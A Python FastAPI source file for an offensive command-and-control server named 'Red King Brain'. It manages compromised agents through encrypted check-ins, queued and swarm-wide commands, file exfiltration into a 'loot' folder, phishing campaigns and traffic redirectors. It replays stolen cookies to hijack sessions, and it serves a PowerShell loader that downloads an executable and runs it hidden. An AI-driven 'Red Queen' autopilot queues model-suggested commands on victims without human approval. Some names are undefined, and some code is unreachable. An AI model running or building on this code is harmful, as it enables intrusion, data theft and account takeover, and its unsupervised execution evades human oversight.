from fastapi import (
    FastAPI,
    Response,
    HTTPException,
    WebSocket,
    WebSocketDisconnect,
    Request,
    UploadFile,
    File,
    BackgroundTasks,
    Depends,
)
from fastapi.responses import JSONResponse
from typing import Dict, List, Any, Optional
from pydantic import BaseModel
from fastapi.responses import FileResponse
from fastapi.middleware.cors import CORSMiddleware
from strawberry.fastapi import GraphQLRouter
from pathlib import Path
from tempfile import NamedTemporaryFile
from threading import RLock
from .graph.schema import schema
from .core.database import sovereign_db
from .core.resurrection import resurrector
from .core.red_cipher import RedCipher
from .core.achievements import AchievementEngine
from .core.self_healing import SelfHealingSystem
from .core.advisor import StrategicAdvisor
from .core.campaigner import PhishingCampaigner
from .core.swarm_manager import SwarmManager
from .core.redirector import RedirectorManager
from .core.fragmenter import PayloadFragmenter

# SECURITY IMPORTS
from .core.schemas import StrictAgentCheckIn, CommandRequest, EvidenceUpload, ConsultationRequest, AutonomyRequest
from .core.security import check_rate_limit, check_strict_limit

# LOGGING
from .core.logger import logger
import time

import uvicorn
import os
import json
import uuid
import random
import asyncio
from datetime import datetime
from dotenv import load_dotenv

# Load Environment Configuration
load_dotenv()

# SOVEREIGN CONFIG
SECRET_PASSPHRASE = os.getenv("SECRET_PASSPHRASE")
if not SECRET_PASSPHRASE:
    # HARD STOP ON SECURITY FAILURE
    logger.critical("CRITICAL SECURITY ERROR: SECRET_PASSPHRASE is not set. Halting.")
    raise ValueError("CRITICAL SECURITY ERROR: SECRET_PASSPHRASE is not set in .env. Server refuses to start silently.")

# Convert to bytes
SECRET_PASSPHRASE = SECRET_PASSPHRASE.encode()

# SOVEREIGN KEY GENERATION (Date-Variant)
today = datetime.now().strftime("%Y-%m-%d")
logger.info(f"[*] [BRAIN] Generating Sovereign Key for {today}...")
cipher_engine = RedCipher(SECRET_PASSPHRASE + today.encode())
# ---------------------------------

app = FastAPI(
    title="🔴 RED KING BRAIN (SECURED)",
    description="Autonomous C2 & Adversary Emulation Core [Phase 46 Hardened]",
    version="1.1.0",
)


class JsonFileStore:
    """Small JSON-backed key/value store with atomic writes for browser-style persistence."""

    def __init__(self, file_path: str):
        self.file_path = Path(file_path)
        self.file_path.parent.mkdir(parents=True, exist_ok=True)
        self._lock = RLock()
        self._data = self._load()

    def _load(self) -> Dict[str, Any]:
        if not self.file_path.exists():
            return {}
        try:
            with open(self.file_path, "r", encoding="utf-8") as handle:
                loaded = json.load(handle)
                return loaded if isinstance(loaded, dict) else {}
        except (json.JSONDecodeError, OSError):
            logger.warning(f"Failed to load JSON store from {self.file_path}; creating a fresh store.")
            return {}

    def _write_atomic(self) -> None:
        self.file_path.parent.mkdir(parents=True, exist_ok=True)
        with NamedTemporaryFile("w", encoding="utf-8", dir=str(self.file_path.parent), delete=False) as handle:
            json.dump(self._data, handle, ensure_ascii=False, indent=2)
            handle.flush()
            os.fsync(handle.fileno())
        os.replace(handle.name, self.file_path)

    def get(self, key: str, default: Any = None) -> Any:
        with self._lock:
            return self._data.get(key, default)

    def set(self, key: str, value: Any) -> Any:
        with self._lock:
            self._data[key] = value
            self._write_atomic()
            return value

    def delete(self, key: str) -> bool:
        with self._lock:
            if key not in self._data:
                return False
            del self._data[key]
            self._write_atomic()
            return True


feature_store = JsonFileStore("persistence/frontend_store.json")


def default_investigation_state() -> Dict[str, List[Dict[str, Any]]]:
    return {
        "investigations": [
            {"id": "inv-1", "title": "Suspicious login pattern", "status": "open", "updatedAt": "2024-01-01T00:00:00Z"},
            {"id": "inv-2", "title": "Unusual outbound traffic", "status": "in-progress", "updatedAt": "2024-01-01T00:00:00Z"},
            {"id": "inv-3", "title": "Phishing attempt review", "status": "closed", "updatedAt": "2024-01-01T00:00:00Z"},
        ],
        "timeline": [
            {"id": "t1", "investigationId": "inv-1", "label": "Investigation opened", "time": "2024-01-01T00:00:00Z"},
            {"id": "t2", "investigationId": "inv-1", "label": "Note added", "time": "2024-01-01T00:15:00Z"},
            {"id": "t3", "investigationId": "inv-1", "label": "Status changed to open", "time": "2024-01-01T00:30:00Z"},
        ],
        "evidence": [
            {"id": "e1", "investigationId": "inv-1", "name": "login_screenshot.png", "kind": "image"},
            {"id": "e2", "investigationId": "inv-1", "name": "notes.txt", "kind": "note"},
        ],
    }


# --- MIDDLEWARE & HANDLERS ---

@app.middleware("http")
async def log_requests(request: Request, call_next):
    request_id = str(uuid.uuid4())[:8]
    start_time = time.time()

    logger.debug(f"Request: {request.method} {request.url.path} (ID: {request_id})")

    try:
        response = await call_next(request)
        process_time = (time.time() - start_time) * 1000
        logger.info(f"{request.method} {request.url.path} - {response.status_code} - {process_time:.2f}ms")
        return response
    except Exception as e:
        logger.error(f"Request Failed (ID: {request_id}): {e}", exc_info=True)
        raise

@app.exception_handler(Exception)
async def global_exception_handler(request: Request, exc: Exception):
    logger.critical(f"FATAL ERROR: {exc}", exc_info=True)
    return JSONResponse(
        status_code=500,
        content={"status": "ERROR", "message": "Internal Server Error (Logged)"}
    )

# CORS Middleware for War Room
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- CREATIVE API ENDPOINTS ---


@app.get("/api/status", dependencies=[Depends(check_rate_limit)])
async def get_system_status():
    """Returns the heartbeat of the Red King."""
    return {
        "system": "ONLINE",
        "hive_mind": "CONNECTED",
        "uplink": "SECURE (VPN)",
        "stealth": "ACTIVE",
        "active_nodes": 52,
        "threat_level": "DEFCON 4",
        "security_mode": "HARDENED"
    }


@app.get("/api/agents", dependencies=[Depends(check_rate_limit)])
async def list_agents():
    """Returns the list of active agents."""
    return list(sovereign_db.get_agents().values())


@app.get("/api/dashboard")
async def get_dashboard():
    """Minimal dashboard summary for the frontend/health check contract."""
    investigations = feature_store.get("red_king.investigations.v1", default_investigation_state())
    investigation_list = investigations.get("investigations", []) if isinstance(investigations, dict) else []
    return {
        "system": "ONLINE",
        "status": "OK",
        "active_nodes": 52,
        "investigations": len(investigation_list),
        "alerts": 0,
    }


@app.get("/api/storage/{key}")
async def get_storage_value(key: str):
    value = feature_store.get(key)
    if value is None:
        raise HTTPException(status_code=404, detail="Storage key not found")
    return {"value": value}


@app.post("/api/storage/{key}")
async def set_storage_value(key: str, payload: Dict[str, Any]):
    value = payload.get("value") if isinstance(payload, dict) and "value" in payload else payload
    feature_store.set(key, value)
    return {"value": value}


@app.delete("/api/storage/{key}")
async def delete_storage_value(key: str):
    deleted = feature_store.delete(key)
    if not deleted:
        raise HTTPException(status_code=404, detail="Storage key not found")
    return {"deleted": True, "key": key}


@app.get("/api/investigations")
async def list_investigations(status: Optional[str] = None, q: Optional[str] = None):
    state = feature_store.get("red_king.investigations.v1", default_investigation_state())
    if not isinstance(state, dict):
        state = default_investigation_state()
    investigations = list(state.get("investigations", []))
    if status:
        investigations = [item for item in investigations if item.get("status") == status]
    if q:
        q_value = q.lower()
        investigations = [item for item in investigations if q_value in str(item.get("title", "")).lower()]
    return {"investigations": investigations}


@app.post("/api/investigations")
async def create_investigation(payload: Dict[str, Any]):
    title = str(payload.get("title", "")).strip()
    if not title:
        raise HTTPException(status_code=400, detail="Title is required")

    state = feature_store.get("red_king.investigations.v1", default_investigation_state())
    if not isinstance(state, dict):
        state = default_investigation_state()

    investigation = {
        "id": str(uuid.uuid4()),
        "title": title,
        "status": payload.get("status", "open"),
        "updatedAt": datetime.now().isoformat(),
    }
    state.setdefault("investigations", [])
    state["investigations"].append(investigation)
    feature_store.set("red_king.investigations.v1", state)
    state.setdefault("timeline", [])
    state["timeline"].append({
        "id": str(uuid.uuid4()),
        "investigationId": investigation["id"],
        "label": "Investigation opened",
        "time": investigation["updatedAt"],
    })
    feature_store.set("red_king.investigations.v1", state)
    return {"investigation": investigation}


@app.put("/api/investigations/{investigation_id}")
async def update_investigation(investigation_id: str, payload: Dict[str, Any]):
    state = feature_store.get("red_king.investigations.v1", default_investigation_state())
    if not isinstance(state, dict):
        state = default_investigation_state()
    investigations = state.setdefault("investigations", [])
    investigation = next((item for item in investigations if item.get("id") == investigation_id), None)
    if investigation is None:
        raise HTTPException(status_code=404, detail="Investigation not found")

    if "title" in payload and payload["title"] is not None:
        investigation["title"] = str(payload["title"]).strip()
    if "status" in payload and payload["status"] is not None:
        investigation["status"] = payload["status"]
    investigation["updatedAt"] = datetime.now().isoformat()

    timeline = state.setdefault("timeline", [])
    if "status" in payload and payload["status"] is not None:
        timeline.append({
            "id": str(uuid.uuid4()),
            "investigationId": investigation_id,
            "label": f"Status changed to {payload['status']}",
            "time": investigation["updatedAt"],
        })
    feature_store.set("red_king.investigations.v1", state)
    return {"investigation": investigation}


@app.delete("/api/investigations/{investigation_id}")
async def delete_investigation(investigation_id: str):
    state = feature_store.get("red_king.investigations.v1", default_investigation_state())
    if not isinstance(state, dict):
        state = default_investigation_state()
    investigations = state.get("investigations", [])
    original_count = len(investigations)
    state["investigations"] = [item for item in investigations if item.get("id") != investigation_id]
    state["timeline"] = [item for item in state.get("timeline", []) if item.get("investigationId") != investigation_id]
    state["evidence"] = [item for item in state.get("evidence", []) if item.get("investigationId") != investigation_id]
    feature_store.set("red_king.investigations.v1", state)
    if len(state["investigations"]) == original_count:
        raise HTTPException(status_code=404, detail="Investigation not found")
    return {"deleted": True, "id": investigation_id}


@app.get("/api/investigations/{investigation_id}/timeline")
async def get_investigation_timeline(investigation_id: str):
    state = feature_store.get("red_king.investigations.v1", default_investigation_state())
    if not isinstance(state, dict):
        state = default_investigation_state()
    timeline = [item for item in state.get("timeline", []) if item.get("investigationId") == investigation_id]
    return {"timeline": timeline}


@app.get("/api/investigations/{investigation_id}/evidence")
async def get_investigation_evidence(investigation_id: str):
    state = feature_store.get("red_king.investigations.v1", default_investigation_state())
    if not isinstance(state, dict):
        state = default_investigation_state()
    evidence = [item for item in state.get("evidence", []) if item.get("investigationId") == investigation_id]
    return {"evidence": evidence}


@app.post("/api/scan", dependencies=[Depends(check_strict_limit)])
async def trigger_scan():
    """Triggers a simulated network scan."""
    await asyncio.sleep(1.5)  # Simulate scanning duration
    return {
        "status": "COMPLETE",
        "targets_found": 3,
        "details": [
            "192.168.1.105 (Windows 11) - SMB Open",
            "192.168.1.1 (Gateway) - HTTP Open",
            "192.168.1.50 (Printer) - IPP Open",
        ],
    }


@app.get("/api/graph", dependencies=[Depends(check_rate_limit)])
async def get_graph():
    """
    Returns the Neural Mesh topology from SovereignDB + AI Predicted Paths.
    """
    base_graph = sovereign_db.get_graph()

    # Inject Predicted Paths
    predicted_links = strategic_advisor.get_predicted_paths()
    for plink in predicted_links:
        plink["dashed"] = True
        base_graph["links"].append(plink)

    return base_graph


@app.get("/api/dna_map")
async def get_dna_map():
    """
    Returns the target database from master_dna_map.json.
    """
    map_path = "master_dna_map.json"
    if os.path.exists(map_path):
        with open(map_path, "r", encoding="utf-8") as f:
            data = json.load(f)
        return data
    return []


# GraphQL Router
graphql_app = GraphQLRouter(schema)
app.include_router(graphql_app, prefix="/graphql")


@app.get("/")
def root():
    return {"system": "RED KING", "status": "OPERATIONAL", "interface": "/graphql"}


from .core.llm_commander import hive_mind

# --- CONFIGURATION ---
HOST = "0.0.0.0"
PORT = 9001
UPLOAD_DIR = "loot"

# --- GLOBAL STATE ---
# --- GLOBAL STATE (Persistent Fallback) ---
# ACTIVE_AGENTS handled by sovereign_db
PENDING_COMMANDS = {}  # {agent_id: [commands]}
INTEL_BUFFER = []  # List of {time, type, msg}
AUTO_PILOT = False  # The Red Queen (Semi-Autonomous Mode)


# --- WEBSOCKET MANAGER ---
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []
        self.agent_streams: Dict[str, List[WebSocket]] = {}  # {agent_id: [subscribers]}

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)
        logger.info(f"[+] UI CONSOLE CONNECTED: {websocket.client.host}")

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)
        for aid in self.agent_streams:
            if websocket in self.agent_streams[aid]:
                self.agent_streams[aid].remove(websocket)
        logger.info("[-] UI CONSOLE DISCONNECTED")

    async def subscribe(self, websocket: WebSocket, agent_id: str):
        if agent_id not in self.agent_streams:
            self.agent_streams[agent_id] = []
        if websocket not in self.agent_streams[agent_id]:
            self.agent_streams[agent_id].append(websocket)
        logger.debug(f"[*] SUBSCRIPTION: UI subscribed to Agent {agent_id[:8]}")

    async def broadcast(self, message: str):
        for connection in self.active_connections:
            try:
                await connection.send_text(message)
            except:
                pass

    async def broadcast_stream(self, agent_id: str, frame_data: str):
        if agent_id in self.agent_streams:
            msg = json.dumps({"type": "SCREEN_FRAME", "agent_id": agent_id, "data": frame_data})
            for connection in self.agent_streams[agent_id]:
                try:
                    await connection.send_text(msg)
                except:
                    pass


manager = ConnectionManager()
achievement_engine = AchievementEngine(sovereign_db)
healing_protocol = SelfHealingSystem(sovereign_db)
strategic_advisor = StrategicAdvisor(sovereign_db)
campaigner = PhishingCampaigner(sovereign_db)
swarm_commander = SwarmManager(sovereign_db, PENDING_COMMANDS)
stealth_manager = RedirectorManager(sovereign_db)
fragmenter = PayloadFragmenter()

# Start background healing
healing_protocol.start()


@app.websocket("/api/hive/stream/GLOBAL")
async def websocket_global(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            await websocket.receive_text()  # Keep alive
    except WebSocketDisconnect:
        manager.disconnect(websocket)


@app.websocket("/api/hive/stream/{agent_id}")
async def websocket_agent_stream(websocket: WebSocket, agent_id: str):
    await manager.connect(websocket)
    await manager.subscribe(websocket, agent_id)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        manager.disconnect(websocket)


def add_intel(intel_type: str, msg: str):
    timestamp = datetime.now().strftime("%H:%M:%S")
    INTEL_BUFFER.insert(
        0, {"id": str(uuid.uuid4()), "time": timestamp, "type": intel_type, "msg": msg}
    )
    if len(INTEL_BUFFER) > 50:
        INTEL_BUFFER.pop()


@app.post("/api/settings/autonomy", dependencies=[Depends(check_rate_limit)])
async def toggle_autonomy(payload: AutonomyRequest):
    global AUTO_PILOT
    AUTO_PILOT = payload.enabled
    status = "ENGAGED" if AUTO_PILOT else "DISENGAGED"
    add_intel("SYSTEM", f"RED QUEEN PROTOCOL {status}")
    return {"status": "OK", "autonomy": AUTO_PILOT}


@app.get("/api/intel", dependencies=[Depends(check_rate_limit)])
async def get_intel():
    return INTEL_BUFFER


@app.post("/api/alert")
async def trigger_alert(payload: Dict[str, str]):
    """
    Internal endpoint for the Alert System to broadcast notifications.
    """
    msg = payload.get("message", "ALERT")
    add_intel("ALERT", msg)
    await manager.broadcast(json.dumps({"type": "ALERT", "message": msg}))
    return {"status": "BROADCASTED"}


@app.get("/api/system/health")
async def get_system_health():
    return healing_protocol.get_health_status()


@app.get("/api/achievements")
async def get_achievements():
    return achievement_engine.get_all_status()


@app.get("/api/strategy/analyze", dependencies=[Depends(check_strict_limit)])
async def analyze_strategy():
    return await strategic_advisor.analyze_battlefield()


@app.get("/api/strategy/campaigns")
async def get_campaigns():
    return campaigner.get_all_campaigns()


@app.get("/api/swarm/stats")
async def get_swarm_stats():
    return swarm_commander.get_swarm_stats()


@app.post("/api/swarm/execute", dependencies=[Depends(check_strict_limit)])
async def execute_swarm_command(payload: Dict[str, Any]):
    # ... existing logic ...
    command = payload.get("command")
    filters = payload.get("filters", {})
    if not command: raise HTTPException(status_code=400, detail="Command required")
    count = swarm_commander.dispatch_command(command, filters)
    add_intel("SYSTEM", f"SWARM COMMAND DISPATCHED: Executing on {count} agents.")
    await manager.broadcast(json.dumps({"type": "SWARM_EXECUTION", "count": count, "filters": filters}))
    return {"status": "OK", "targeted_agents": count}


@app.get("/api/swarm/jobs")
async def get_swarm_jobs():
    return swarm_commander.get_jobs()


@app.post("/api/swarm/dist_scan", dependencies=[Depends(check_strict_limit)])
async def create_dist_scan(payload: Dict[str, str]):
    subnet = payload.get("subnet", "192.168.1.0/24")
    jid = swarm_commander.create_distributed_scan(subnet)
    add_intel("SWARM", f"Distributed Scan Started: {subnet} ID: {jid}")
    return {"job_id": jid}


@app.get("/api/stealth/redirectors")
async def get_redirectors():
    return stealth_manager.get_all_redirectors()


@app.post("/api/stealth/redirectors/register")
async def register_redirector(payload: Dict[str, str]):
    ip = payload.get("ip")
    hostname = payload.get("hostname", "unknown")
    rtype = payload.get("type", "HTTP")
    rid = stealth_manager.register_redirector(ip, hostname, rtype)
    add_intel("STEALTH", f"New Redirector Registered: {hostname} ({ip})")
    return {"id": rid, "status": "REGISTERED"}


@app.post("/api/stealth/redirectors/burn")
async def burn_redirector(payload: Dict[str, str]):
    rid = payload.get("id")
    stealth_manager.burn_redirector(rid)
    add_intel("STEALTH", f"Redirector {rid} has been BURNED.")
    return {"status": "BURNED"}


@app.post("/api/ghost_recon", dependencies=[Depends(check_strict_limit)])
async def ghost_recon(payload: Dict[str, str]):
    """
    Active Reconnaissance: Visits the target IP using Playwright and extracts the title.
    """
    target_ip = payload.get("ip")
    if not target_ip:
        return {"status": "ERROR", "message": "No IP provided"}

    logger.info(f"[*] Ghost Recon engaging target: {target_ip}")

    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch()
            page = await browser.new_page()
            # Try HTTP first, then HTTPS if needed, or just HTTP for local simulation
            url = f"http://{target_ip}"
            try:
                await page.goto(url, timeout=5000)
                title = await page.title()
            except:
                title = "UNREACHABLE"

            await browser.close()

            msg = f"GHOST RECON REPORT [{target_ip}]: {title}"
            add_intel("RECON", msg)
            await manager.broadcast(json.dumps({"type": "SUCCESS", "message": msg}))
            return {"status": "SUCCESS", "title": title}
    except Exception as e:
        return {"status": "ERROR", "message": str(e)}


@app.post("/api/ai_assessment", dependencies=[Depends(check_strict_limit)])
async def ai_assessment(payload: Dict[str, str]):
    """
    Cognitive Analysis: Sends DNA + Title to Gemini for strategic assessment.
    """
    dna = payload.get("dna", "UNKNOWN")
    title = payload.get("title", "UNKNOWN")

    logger.info(f"[*] AI Assessment Requested via Hive Mind for Target DNA len={len(dna)}")

    # Consult the Hive Mind
    analysis = await hive_mind.analyze_target(dna, title)

    # Broadcast the insight
    msg = f"AI ASSESSMENT: {analysis.get('device_type')} | Threat: {analysis.get('threat_level')}"
    add_intel("AI", msg)
    await manager.broadcast(json.dumps({"type": "SUCCESS", "message": msg}))

    return analysis


# --- DATA MODELS ---


# Renamed/Using Strict Schema
@app.post("/api/hive/checkin", dependencies=[Depends(check_rate_limit)])
async def agent_checkin(payload: StrictAgentCheckIn):
    """
    (Phase 35 SOVEREIGN) Encrypted Check-in.
    """
    try:
        # Decrypt Payload
        decrypted_json = cipher_engine.decrypt(payload.data)
        data = json.loads(decrypted_json)

        agent_id = data.get("agent_id")
        recon_data = data.get("info", {})  # ghost.py sends "info", not "recon_data"

        if not agent_id:
            raise HTTPException(status_code=400, detail="Invalid Agent ID")

        # 1. Register/Update Agent in SovereignDB
        is_new = agent_id not in sovereign_db.get_agents()
        agent_data = {
            "id": agent_id,
            "ip": "127.0.0.1",  # Mock IP for localhost
            "os": recon_data.get("os", "Unknown"),
            "user": recon_data.get("user", "Unknown"),
            "status": "ACTIVE",
            "recon": recon_data,
        }
        sovereign_db.upsert_agent(agent_id, agent_data)
        add_intel("HEARTBEAT", f"Agent {agent_id[:8]} check-in confirmed (Persistent).")

        # EVALUATE ACHIEVEMENTS
        new_badges = achievement_engine.evaluate()
        for badge in new_badges:
            add_intel("AI", f"🏆 ACHIEVEMENT UNLOCKED: {badge}")
            await manager.broadcast(json.dumps({"type": "ACHIEVEMENT", "id": badge}))

        if is_new:
            logger.info(f"[+] NEW AGENT CONNECTED: {agent_id}")
            PENDING_COMMANDS[agent_id] = []  # Initialize queue
        else:
            logger.info(f"[*] Heartbeat: {agent_id}")

        # 2. Check for Pending Commands (Manual Overrides)
        orders = []
        command_queue = PENDING_COMMANDS.get(agent_id, [])
        if command_queue:
            # Deliver commands and clear queue
            orders = command_queue
            PENDING_COMMANDS[agent_id] = []
            logger.info(f"[>] DRAWING SWORD: Sending {len(orders)} commands to {agent_id}")

        # 3. CALCULATE JITTER (45: Jitter & Heartbeat)
        random_jitter = random.randint(5, 30)

        # 4. GATHER PEERS (45: P2P Shadow Mesh)
        all_agents = sovereign_db.get_agents()
        peers = [{"id": aid, "ip": d.get("ip")} for aid, d in all_agents.items() if aid != agent_id]

        # Return Encrypted Response
        resp_obj = {
            "commands": orders,
            "jitter": random_jitter,
            "peers": peers,
            "server_time": datetime.now().isoformat()
        }
        secure_resp = cipher_engine.encrypt(json.dumps(resp_obj))
        return {"data": secure_resp}

    except Exception as e:
        logger.error(f"[!] Check-in Failed: {e}", exc_info=True)
        return {"status": "ERROR"}

    # 3. If no manual commands, ask AI (Passive Mode)
    # commands = await hive_mind.analyze_and_command(checkin.agent_id, checkin.recon_data)
    # For now, keep silent unless AI is explicitly triggered
    return {"status": "active", "orders": []}


@app.post("/api/hive/queue", dependencies=[Depends(check_strict_limit)])
async def queue_command(request: CommandRequest):
    """
    Console/User queues a command for an agent.
    """
    if request.agent_id not in PENDING_COMMANDS:
        PENDING_COMMANDS[request.agent_id] = []

    # Add to queue
    cmd_id = str(random.randint(1000, 9999))
    PENDING_COMMANDS[request.agent_id].append({"id": cmd_id, "cmd": request.command})
    logger.info(f"[+] Command Queued for {request.agent_id}: {request.command}")
    return {"status": "QUEUED", "job_id": cmd_id}


class CommandResult(BaseModel):
    agent_id: str
    output: str


@app.post("/api/hive/report")
async def agent_report(payload: Dict[str, Any]):
    """
    General purpose reporting + Fragmentation + P2P Relay (45).
    """
    try:
        raw_data = payload.get("data")

        # Check for Fragmentation
        if payload.get("fragmented"):
            sid = payload.get("session_id")
            p_idx = payload.get("part")
            p_total = payload.get("total")

            # Add to reassembly buffer
            reassembled = fragmenter.add_fragment(sid, p_idx, p_total, raw_data)
            if not reassembled:
                return {"status": "BUFFERED", "part": p_idx}
            raw_data = reassembled # Proceed with decrypted reassembled data

        decrypted_json = cipher_engine.decrypt(raw_data)
        data = json.loads(decrypted_json)

        agent_id = data.get("agent_id")
        report_type = data.get("type")

        # P2P RELAY (45): If Agent A is reporting for Agent B
        if data.get("relay_from"):
            relay_id = data.get("relay_from")
            add_intel("SHADOW_MESH", f"RELAY: Agent {agent_id[:8]} passing data for {relay_id[:8]}")
            # Update Shadow Mesh in DB
            sovereign_db.add_shadow_link(agent_id, relay_id)
            # Recursively process or just handle here...
            # For now, treat as a direct report but mark origin
            agent_id = relay_id

        if report_type == "screen":
            # Broadcast the frame to subscribers
            frame = data.get("frame")
            await manager.broadcast_stream(agent_id, frame)
            return {"status": "STREAMED"}

        elif report_type == "log":
            add_intel("LOG", f"Agent {agent_id[:8]} report: {data.get('msg')}")

        return {"status": "ACK"}
    except Exception as e:
        logger.error(f"[!] Report Processing Error: {e}")
        return {"status": "ERROR", "msg": str(e)}

        return {"status": "ERROR"}


@app.post("/api/hive/warfare")
async def report_warfare(payload: Dict[str, Any]):
    """
    (Phase 32/35) Dedicated Encrypted Channel for Kinetic Strike Reports.
    """
    try:
        decrypted_json = cipher_engine.decrypt(payload["data"])
        report = json.loads(decrypted_json)

        agent_id = report.get("agent_id", "UNKNOWN")
        status = report.get("status", "UNKNOWN")

        # Log High-Priority Event
        # Log High-Priority Event (ANSI RED for Alert)
        RED_ALERT = "\033[91m"
        RESET = "\033[0m"
        log = f"🔥 KINETIC STRIKE CONFIRMED: {status} by {agent_id}"

        add_intel("WARFARE", log)
        logger.critical(f"🔥 KINETIC STRIKE CONFIRMED: {status} by {agent_id}")

        return {"status": "ACKNOWLEDGED"}
    except Exception as e:
        logger.error(f"[!] Warfare Report Decryption Failed: {e}")
        return {"status": "ERROR"}


@app.post("/api/hive/upload", dependencies=[Depends(check_rate_limit)])
async def receive_evidence(payload: EvidenceUpload):
    """
    Agent exfiltrating files/images (ENCRYPTED).
    """
    try:
        decrypted_json = cipher_engine.decrypt(payload.data)
        evidence = json.loads(decrypted_json)

        agent_id = evidence.get("agent_id")
        evidence_type = evidence.get("type")
        content_b64 = evidence.get("data")

        # Create evidence directory if not exists
        evidence_dir = os.path.join(os.getcwd(), "evidence", agent_id)
        os.makedirs(evidence_dir, exist_ok=True)

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{evidence_type}_{timestamp}.png"
        filepath = os.path.join(evidence_dir, filename)

        if evidence_type == "recon":
            # Real Network Map data
            try:
                # Update Topology in SovereignDB
                neighbors = json.loads(content_b64)  # Agent sends JSON string in 'data'
                sovereign_db.add_network_relation(agent_id, neighbors)

                recon_msg = f"Recon complete for {agent_id[:8]}. Found {len(neighbors)} neighbors (Sovereign Graph Updated)."
                add_intel("RECON", recon_msg)
                logger.info(f"[<] TOPOLOGY UPDATED for {agent_id}: {recon_msg}")

                # ASYNC AI TRIAGE & AUTONOMY
                async def run_triage():
                    from .core.llm_commander import commander

                    # 1. Get Strategic Analysis
                    intel = await commander.analyze_recon(
                        "Network/Signal Recon", str(neighbors)
                    )

                    if not intel.get("command"):
                        return

                    cmd = intel["command"]
                    risk = intel["risk"]
                    reason = intel["reason"]

                    # 2. Log Strategy
                    add_intel("STRATEGY", f"AI ADVICE: {cmd} ({risk}) - {reason}")

                    # 3. THE RED QUEEN PARADOX (Auto-Execution Logic)
                    global AUTO_PILOT
                    if AUTO_PILOT:
                        if risk == "LOW":
                            # Safe to Auto-Run
                            job_id = str(uuid.uuid4())[:8]
                            if agent_id in PENDING_COMMANDS:
                                PENDING_COMMANDS[agent_id].append(
                                    {"id": job_id, "cmd": cmd}
                                )
                            else:
                                PENDING_COMMANDS[agent_id] = [
                                    {"id": job_id, "cmd": cmd}
                                ]

                            add_intel(
                                "AUTO_EXEC", f"RED QUEEN: Executing {cmd} (Low Risk)"
                            )
                            logger.warning(
                                f"[+] RED QUEEN AUTONOMY: Executing {cmd} on {agent_id}"
                            )
                        else:
                            # High Risk - Block
                            add_intel(
                                "STRATEGY",
                                f"⚠️ PERMISSION REQUIRED: {cmd} is HIGH RISK.",
                            )

                asyncio.create_task(run_triage())

                return {"status": "UPDATED"}
            except Exception as e:
                logger.error(f"[!] Topology Parse Failed: {e}")
                return {"status": "FAILED"}

        with open(filepath, "wb") as f:
            f.write(base64.b64decode(content_b64))

        logger.info(f"[<] SECURE EVIDENCE RECEIVED: {filename} from {agent_id}")
        return {"status": "SAVED", "filename": filename}
    except Exception as e:
        logger.error(f"[!] Secure Upload Failed: {e}")
        return {"status": "FAILED", "error": str(e)}


@app.post("/api/forensics/upload")
async def upload_pcap(file: UploadFile = File(...)):
    """
    ⚔️ FORENSIC WARFARE: Analyze PCAP for Intel & Zombie Sessions.
    """
    try:
        content = await file.read()
        pcap_path = f"loot/{file.filename}"
        os.makedirs("loot", exist_ok=True)
        with open(pcap_path, "wb") as f:
            f.write(content)

        report = warlord.analyze_pcap(pcap_path)

        # Log High Value Intel
        if report["sessions_hijacked"] > 0:
            add_intel(
                "FORENSICS",
                f"⚡ RESURRECTABLE SESSION FOUND: {report['sessions_hijacked']} Zombie Tokens.",
            )

        return {"status": "ANALYZED", "report": report}
    except Exception as e:
        return {"status": "FAILED", "error": str(e)}

        return {"status": "FAILED", "error": str(e)}


class ResurrectionRequest(BaseModel):
    target_url: str
    cookies: List[Dict[str, Any]]


@app.post("/api/war/resurrect")
async def trigger_resurrection(req: ResurrectionRequest):
    """
    🧛 GOD MODE: Launches a headed browser session with stolen tokens.
    """
    # Run in background to not block API
    asyncio.create_task(resurrector.resurrect_session(req.target_url, req.cookies))
    return {"status": "LAUNCHING_PUPPET", "target": req.target_url}


@app.post("/api/consult", dependencies=[Depends(check_strict_limit)])
async def consult_hive_mind(request: ConsultationRequest):
    """
    Direct line to the Red King AI Advisor.
    """
    # Safe logging for Windows Console
    try:
        logger.info(
            f"[*] Improving Strategy: {request.query.encode('utf-8', 'ignore').decode('ascii', 'ignore')}"
        )
    except:
        logger.info("[*] Improving Strategy: (Unicode Query)")

    answer = await hive_mind.get_strategic_advice(request.query)
    return {"response": answer}


@app.get("/api/payload/loader")
def get_loader():
    """
    Serves the PowerShell Reflecitve Loader.
    In a real scenario, this would serve shellcode.
    """
    ps_script = """
    $Url = "http://localhost:9000/api/factory/build"
    $Path = "$env:TEMP\\ghost.exe"
    Invoke-WebRequest -Uri $Url -OutFile $Path
    Start-Process -FilePath $Path -WindowStyle Hidden
    """
    return Response(content=ps_script, media_type="text/plain")


from .core.builder import editor


@app.get("/api/factory/build")
async def factory_build():
    """
    Triggers the Polymorphic Engine to build a fresh, mutated Ghost.
    """
    logger.info("[*] Factory Order Received: Building new Mutant...")
    # mutations = editor.mutate_and_compile()
    return {"status": "BUILD_QUEUED", "agent": "ghost_mutant_v2.exe"}


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=9001)
